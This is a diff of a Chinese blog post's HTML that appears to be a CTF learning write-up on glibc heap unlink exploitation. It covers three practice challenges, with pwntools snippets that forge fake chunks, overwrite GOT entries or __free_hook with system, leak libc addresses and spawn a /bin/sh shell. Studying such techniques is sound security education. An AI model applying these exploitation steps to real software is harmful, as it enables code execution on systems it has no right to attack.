@@ -19,7 +19,9 @@
 
   <!-- 页面元数据 -->
   
-  <title>堆利用(二)之unlink⌛️ - 虽然没什么用但还是想记下来</title>
+  <title>堆利用(二)之unlink - 虽然没什么用但还是想记下来</title>
+  
+    <meta name="keywords" content="unlink">
   
 
   
@@ -384,7 +386,7 @@
     
     
       <h1 class="title">
-        堆利用(二)之unlink⌛️
+        堆利用(二)之unlink
       </h1>
       <div class='new-meta-box'>
         
@@ -401,6 +403,13 @@
         
           
             
+  <div class='new-meta-item category'>
+    <a class='notlink'>
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <a class="category-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/">二进制</a>
+    </a>
+  </div>
+
 
           
         
@@ -419,7 +428,7 @@
   <div class="new-meta-item browse leancloud">
     <a class='notlink'>
       
-      <div id="lc-pv" data-title="堆利用(二)之unlink⌛️" data-path="/2021/01/22/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink/">
+      <div id="lc-pv" data-title="堆利用(二)之unlink" data-path="/2021/01/22/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink/">
         <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
         <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
         次浏览
@@ -436,9 +445,8 @@
 
 
   
-  <p>1、基础知识</p>
-<p>连续free的堆块，会被合并，放入unsorted bin中。</p>
-<p>之前unlink的宏</p>
+  <h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>连续free的堆块，会被合并，放入unsorted bin中。</p>
+<p>之前unlink的宏定义</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;</span></span><br><span class="line"></span><br><span class="line"> FD = P-&gt;fd;                <span class="comment">//FD = *P + 8;</span></span><br><span class="line"> BK = P-&gt;bk;               <span class="comment">// BK = *P + 12;</span></span><br><span class="line"> FD-&gt;bk = BK;             <span class="comment">//  FD + 12 = BK; </span></span><br><span class="line"> BK-&gt;fd = FD;            <span class="comment">//   BK + 8 = FD; </span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>相当于当前的P向它的前一个堆块合并。</p>
@@ -459,66 +467,65 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x603430</span>:	<span class="number">0x0000000000602048</span>	<span class="number">0x0000000000602050</span></span><br></pre></td></tr></table></figure>
 
 <p>以上分别是fd、bk位置的值。</p>
-<p>![image-20210122224902265](/Users/my/Library/Application Support/typora-user-images/image-20210122224902265.png)</p>
+<p><img src="/images/pasted-183.png" class="lazyload" data-srcset="/images/pasted-183.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>修改chunk1的pre_chunk_size字段和size字段，以便于在free(chunk1)的时候，可以合并我们构造的这个伪堆块。</p>
 <p>语句<code>chunk1_hdr[0] = malloc_size;</code>，将堆块1的pre_size设置为malloc_size的大小，即0x80。</p>
-<p>![image-20210122225858997](/Users/my/Library/Application Support/typora-user-images/image-20210122225858997.png)</p>
+<p><img src="/images/pasted-184.png" class="lazyload" data-srcset="/images/pasted-184.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>语句<code>chunk1_hdr[1] &amp;= ~1;</code>，与1进行异或，将最后的inuse位设为0。</p>
-<p>![截屏2021-01-22 下午11.04.04](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-22 下午11.04.04.png)</p>
+<p><img src="/images/pasted-185.png" class="lazyload" data-srcset="/images/pasted-185.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>free chunk1之后</p>
-<p>![截屏2021-01-22 下午11.28.05](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-22 下午11.28.05.png)</p>
-<p>![截屏2021-01-22 下午11.05.30](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-22 下午11.05.30.png)</p>
+<p><img src="/images/pasted-186.png" class="lazyload" data-srcset="/images/pasted-186.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
+<p><img src="/images/pasted-187.png" class="lazyload" data-srcset="/images/pasted-187.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>原来chunk0_ptr指向的值chunk0的位置，现在指向&amp;chunk0_ptr-3的地方</p>
-<p>![截屏2021-01-22 下午11.33.55](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-22 下午11.33.55.png)</p>
+<p><img src="/images/pasted-188.png" class="lazyload" data-srcset="/images/pasted-188.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p><code>0x48+0x18 = 0x60</code></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string <span class="comment">//其实就是chunk0_ptr[3] =chunk0_ptr[0] =  &amp;victim_string </span></span><br></pre></td></tr></table></figure>
 
-<p>![截屏2021-01-22 下午11.38.06](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-22 下午11.38.06.png)</p>
-<p>![截屏2021-01-22 下午11.39.30](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-22 下午11.39.30.png)</p>
+
+<p><img src="/images/pasted-189.png" class="lazyload" data-srcset="/images/pasted-189.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
+<p><img src="/images/pasted-190.png" class="lazyload" data-srcset="/images/pasted-190.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>此时再去修改chunk0[0]的值，改的是原来字符串的值</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br></pre></td></tr></table></figure>
 
-<p>![截屏2021-01-22 下午11.43.29](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-22 下午11.43.29.png)</p>
-<p>![截屏2021-01-22 下午11.43.59](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-22 下午11.43.59.png)</p>
+
+<p><img src="/images/pasted-191.png" class="lazyload" data-srcset="/images/pasted-191.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>即我们可以在 <code>&amp;chunk</code>中实现任意读写。</p>
-<p>例题1:chunk</p>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>例题1:chunk</p>
 <p>add 3个块</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">3</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x100</span>)</span><br></pre></td></tr></table></figure>
 
 <p>查看真实的大小，发现是0x111</p>
-<p>![截屏2021-01-23 上午11.55.27](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-23 上午11.55.27.png)</p>
+<p><img src="/images/pasted-192.png" class="lazyload" data-srcset="/images/pasted-192.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">py = <span class="string">&#x27;&#x27;</span></span><br><span class="line">py += p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) <span class="comment">#从0x603010开始，presize设为真实的size - 0x10</span></span><br><span class="line">py += p64(<span class="number">3</span>)*<span class="number">30</span> <span class="comment">#填充</span></span><br><span class="line"></span><br><span class="line">py += p64(<span class="number">0x100</span>) + p64(<span class="number">0x110</span>)  <span class="comment">#pre_inuse 设为0，presize设为0x100</span></span><br></pre></td></tr></table></figure>
 
 
 
 <p>下面往fake_chunk里面写fd指针的bk指针的值。</p>
 <p>ida找到chunk的地址为0x602280，我们要合并的是3号块，地址是<code>0x602280 + 8*3</code></p>
-<p>![截屏2021-01-23 下午4.07.53](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-23 下午4.07.53.png)</p>
+<p><img src="/images/pasted-193.png" class="lazyload" data-srcset="/images/pasted-193.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="number">0x602298</span></span><br><span class="line">fd = ptr - <span class="number">0x18</span></span><br><span class="line">bk = ptr - <span class="number">0x10</span></span><br></pre></td></tr></table></figure>
 
 
 
 <p>此时堆块已经伪造好了。</p>
-<p>![image-20210127120430300](/Users/my/Library/Application Support/typora-user-images/image-20210127120430300.png)</p>
+<p><img src="/images/pasted-194.png" class="lazyload" data-srcset="/images/pasted-194.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>fd-&gt;bk = 0x602280 + 0x18 = 0x602298</p>
 <p>bk-&gt;fd = 0x602288 + 0x10 = 0x602298</p>
 <p>所以绕过了检查。接下来free下一个堆块。</p>
 <p>效果是：两个堆块合并，所以前一个堆块大小变大了，并且fd和bk的值都变了。</p>
-<p>![image-20210127121357533](/Users/my/Library/Application Support/typora-user-images/image-20210127121357533.png)</p>
+<p><img src="/images/pasted-195.png" class="lazyload" data-srcset="/images/pasted-195.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>并且往原来的地址0x602298处 写入了 值0x602280 。</p>
-<p>![image-20210127121635544](/Users/my/Library/Application Support/typora-user-images/image-20210127121635544.png)</p>
+<p><img src="/images/pasted-196.png" class="lazyload" data-srcset="/images/pasted-196.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>再次edit 3号块，就会edit 0x602280地址处的内容。<code>edit(3,0x20,&#39;AAA&#39;)</code></p>
-<p>![image-20210127122036506](/Users/my/Library/Application Support/typora-user-images/image-20210127122036506.png)</p>
-<p>![image-20210127122200870](/Users/my/Library/Application Support/typora-user-images/image-20210127122200870.png)</p>
+<p><img src="/images/pasted-197.png" class="lazyload" data-srcset="/images/pasted-197.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>接下来往0x602280处写入free_hook的地址。<code>free_hook = libc_base + libc.sym[&quot;__free_hook&quot;]</code></p>
 <p>再往free_hook里面写入system </p>
 <p>再次free一个堆块的时候，参数设置为/bin/sh，即可getshell。</p>
 <p>例题2: uunlink</p>
 <p>注意：此题没有show功能。</p>
-<p>![image-20210127124018733](/Users/my/Library/Application Support/typora-user-images/image-20210127124018733.png)</p>
-<p>![image-20210127124059445](/Users/my/Library/Application Support/typora-user-images/image-20210127124059445.png)</p>
+<p><img src="/images/pasted-198.png" class="lazyload" data-srcset="/images/pasted-198.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>先malloc几个堆块。然后ida中找到chunk的地址，就是我们的ptr。此处是<code>0x602300</code></p>
-<p>![image-20210127125203319](/Users/my/Library/Application Support/typora-user-images/image-20210127125203319.png)</p>
+<p><img src="/images/pasted-199.png" class="lazyload" data-srcset="/images/pasted-199.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>下面构造fake_chunk。构造好之后，ida查看delete函数的地址是400BA0，free函数的是0x400730，设断点进行调试。</p>
 <p>有以下两种方式</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#debug(0x400730,0) </span></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *0x400BA0&quot;)</span></span><br></pre></td></tr></table></figure>
@@ -526,9 +533,9 @@
 
 
 <p>free之后，堆块内容如下</p>
-<p>![FA1E5233-25E3-4FC4-AE4F-E78CD0D0A525](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/FA1E5233-25E3-4FC4-AE4F-E78CD0D0A525.png)</p>
+<p><img src="/images/pasted-200.png" class="lazyload" data-srcset="/images/pasted-200.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>在此edit 0号块，其实是从 0x602300 - 0x18处开始编辑的。</p>
-<p>![75DE81B2-85CF-4519-8E72-B40E21AC6AFB](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/75DE81B2-85CF-4519-8E72-B40E21AC6AFB.png)</p>
+<p><img src="/images/pasted-201.png" class="lazyload" data-srcset="/images/pasted-201.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>调试的时候发现调用了</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">atoi_got = elf.got[<span class="string">&quot;atoi&quot;</span>] <span class="comment">#0x602060</span></span><br><span class="line">free_got = elf.got[<span class="string">&quot;free&quot;</span>] <span class="comment">#0x602018</span></span><br><span class="line">puts_plt = elf.sym[<span class="string">&quot;puts&quot;</span>] <span class="comment">#0x400740</span></span><br></pre></td></tr></table></figure>
 
@@ -536,17 +543,17 @@
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">py = <span class="string">&#x27;&#x27;</span></span><br><span class="line">py += <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>   <span class="comment">#填充</span></span><br><span class="line">py += p64(atoi_got)	<span class="comment">#0号块</span></span><br><span class="line">py += p64(atoi_got)	<span class="comment">#1号块</span></span><br><span class="line">py += p64(free_got)	<span class="comment">#2号块</span></span><br><span class="line">py += p64(<span class="number">9</span>)*<span class="number">6</span> <span class="comment">#填充</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x60</span>,py)</span><br></pre></td></tr></table></figure>
 
-<p>![截屏2021-01-30 下午5.41.43](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-30 下午5.41.43.png)</p>
-<p>![截屏2021-01-30 下午5.47.54](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-30 下午5.47.54.png)</p>
+
+<p><img src="/images/pasted-202.png" class="lazyload" data-srcset="/images/pasted-202.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>这一步会让堆块指向我们填入的地址。再次edit堆块的时候，其实edit的是填入地址的值。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>,<span class="number">0x10</span>,p64(puts_plt)) <span class="comment">#将原来的free改成puts_plt</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>) <span class="comment">#其实就是输出0号块</span></span><br><span class="line">rc(<span class="number">1</span>)</span><br><span class="line">addr = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&quot;atoi&quot;</span>] <span class="comment">#减掉偏移</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;addr---&gt;&quot;</span>+hex(addr) <span class="comment">#输出的是基地址</span></span><br><span class="line">system = addr + libc.sym[<span class="string">&quot;system&quot;</span>] <span class="comment">#system的地址</span></span><br></pre></td></tr></table></figure>
 
 <p>地址如下：</p>
-<p>![截屏2021-01-30 下午7.18.13](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-30 下午7.18.13.png)</p>
+<p><img src="/images/pasted-203.png" class="lazyload" data-srcset="/images/pasted-203.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>接下来将1号块改为<code>system</code>的地址<code>edit(1,0x10,p64(system))</code></p>
-<p>![截屏2021-01-30 下午7.22.39](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-30 下午7.22.39.png)</p>
+<p><img src="/images/pasted-204.png" class="lazyload" data-srcset="/images/pasted-204.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>再次调用atoi函数的时候，就会跳转到system。</p>
-<p>![截屏2021-01-30 下午11.40.55](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-30 下午11.40.55.png)</p>
+<p><img src="/images/pasted-205.png" class="lazyload" data-srcset="/images/pasted-205.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>ida中查看发现，每次最开始输入完菜单之后，都会运行一次atoi，所以再次直接输入参数/bin/sh即可getshell</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ru(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">sl(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
@@ -554,27 +561,23 @@
 
 <p>例题3: stkof</p>
 <p>程序运行时没有提示</p>
-<p>![截屏2021-01-30 下午7.38.13](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-30 下午7.38.13.png)</p>
+<p><img src="/images/pasted-206.png" class="lazyload" data-srcset="/images/pasted-206.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>首选构造的fake_chunk如下</p>
-<p>![截屏2021-01-31 上午12.25.07](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-31 上午12.25.07.png)</p>
+<p><img src="/images/pasted-207.png" class="lazyload" data-srcset="/images/pasted-207.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>覆盖下一个堆块的size头后，如下</p>
-<p>![截屏2021-01-31 上午12.26.19](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-31 上午12.26.19.png)</p>
+<p><img src="/images/pasted-208.png" class="lazyload" data-srcset="/images/pasted-208.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>free之后，2号和3号合并。再edit 2号块，实际上就是在edit  ptr - 0x18的位置处的值。</p>
 <p><code>edit(2,0x10,&#39;AAA&#39;)</code></p>
-<p>![截屏2021-01-31 上午12.32.53](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-31 上午12.32.53.png)</p>
-<p>![截屏2021-01-31 上午12.34.50](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-31 上午12.34.50.png)</p>
+<p><img src="/images/pasted-209.png" class="lazyload" data-srcset="/images/pasted-209.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">py1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">py1 += p64(<span class="number">0</span>) + p64(atoi_got) + p64(puts_got) + p64(free_got)</span><br><span class="line">edit(<span class="number">2</span>,len(py1),py1)</span><br></pre></td></tr></table></figure>
 
-<p>![截屏2021-01-31 上午12.39.16](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-31 上午12.39.16.png)</p>
+<p><img src="/images/pasted-210.png" class="lazyload" data-srcset="/images/pasted-210.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>此时0x602150处的值是0x602018，再次edit 2号块，实际上edit的是0x602018处的值。原本是free函数，就会把其改成相应的值。</p>
-<p>![截屏2021-01-31 上午12.44.49](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-31 上午12.44.49.png)</p>
-<p>![截屏2021-01-31 上午12.45.47](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-31 上午12.45.47.png)</p>
+<p><img src="/images/pasted-211.png" class="lazyload" data-srcset="/images/pasted-211.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">py2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">py2 += p64(puts_plt)</span><br><span class="line">edit(<span class="number">2</span>,len(py2),py2)</span><br></pre></td></tr></table></figure>
 
 <p>这样就把free函数改成了puts_plt。</p>
-<p>![截屏2021-02-02 上午12.06.09](/Users/my/Library/Application Support/typora-user-images/截屏2021-02-02 上午12.06.09.png)</p>
-<p>![截屏2021-01-31 上午12.49.18](/Users/my/Library/Application Support/typora-user-images/截屏2021-01-31 上午12.49.18.png)</p>
-<p>![截屏2021-02-02 上午12.32.06](/Users/my/Library/Application Support/typora-user-images/截屏2021-02-02 上午12.32.06.png)</p>
+<p><img src="/images/pasted-212.png" class="lazyload" data-srcset="/images/pasted-212.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>free所在的堆块号为2，前面的puts_got为堆块1。用puts_plt泄漏出pus_got的地址 <code>puts_addr---&gt;0x7ffff7a7c6a0</code></p>
 <p>然后就可以找到system的地址。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system = puts_addr - libc.symbols[<span class="string">&quot;puts&quot;</span>] + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure>
@@ -582,10 +585,10 @@
 
 
 <p>刚才覆盖的atoi的堆块为0号，将其改为system</p>
-<p>![截屏2021-02-02 上午12.40.34](/Users/my/Library/Application Support/typora-user-images/截屏2021-02-02 上午12.40.34.png)</p>
+<p><img src="/images/pasted-213.png" class="lazyload" data-srcset="/images/pasted-213.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>直接传入参数/bin/sh即可。</p>
-<p>![截屏2021-02-02 上午12.41.54](/Users/my/Library/Application Support/typora-user-images/截屏2021-02-02 上午12.41.54.png)</p>
-<p>可参考如下文章 <a target="_blank" rel="noopener" href="https://wzt.ac.cn/2018/10/16/s-pwn-project-4/">https://wzt.ac.cn/2018/10/16/s-pwn-project-4/</a></p>
+<p><img src="/images/pasted-214.png" class="lazyload" data-srcset="/images/pasted-214.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
+<p>本题可参考如下文章 <a target="_blank" rel="noopener" href="https://wzt.ac.cn/2018/10/16/s-pwn-project-4/">https://wzt.ac.cn/2018/10/16/s-pwn-project-4/</a></p>
 
   
   
@@ -620,7 +623,7 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-02-02T00:48:36+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-02-02T01:11:26+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
     <p>更新于：Feb 2, 2021</p>
@@ -631,6 +634,9 @@
       
         
           
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/unlink/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>unlink</p></a></div>
+
 
         
       
@@ -642,7 +648,7 @@
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2021/01/22/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink/&title=堆利用(二)之unlink⌛️ - 虽然没什么用但还是想记下来&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2021/01/22/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink/&title=堆利用(二)之unlink - 虽然没什么用但还是想记下来&summary="
           
           >
           
@@ -654,7 +660,7 @@
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2021/01/22/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink/&title=堆利用(二)之unlink⌛️ - 虽然没什么用但还是想记下来&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2021/01/22/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink/&title=堆利用(二)之unlink - 虽然没什么用但还是想记下来&summary="
           
           >
           
@@ -666,7 +672,7 @@
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2021/01/22/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink/&title=堆利用(二)之unlink⌛️ - 虽然没什么用但还是想记下来&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2021/01/22/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink/&title=堆利用(二)之unlink - 虽然没什么用但还是想记下来&summary="
           
           >
           
@@ -697,7 +703,7 @@
     <div class="prev-next">
       
         <a class='prev' href='/2021/01/23/%E6%81%B6%E6%84%8FURL%E6%A3%80%E6%B5%8B%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%E4%BA%8C/'>
-          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>恶意URL检测(二)代码实现</p>
+          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>恶意URL检测(二)代码实现⌛️</p>
           <p class='content'>问题1：python3中安装了 sk-learn，但脚本中不能导入
 可能是python3.8的版本问题，改为用python2。在运行脚本的时候也要用python2。
 参考 https://www...</p>
@@ -739,6 +745,20 @@
 
 
 
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-text">例题</span></a></li></ol>
+    </div>
+  </section>
+
 
   
 
@@ -755,7 +775,7 @@
 <script>
   window.pdata={}
   pdata.ispage=true;
-  pdata.postTitle="堆利用(二)之unlink⌛️";
+  pdata.postTitle="堆利用(二)之unlink";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
 
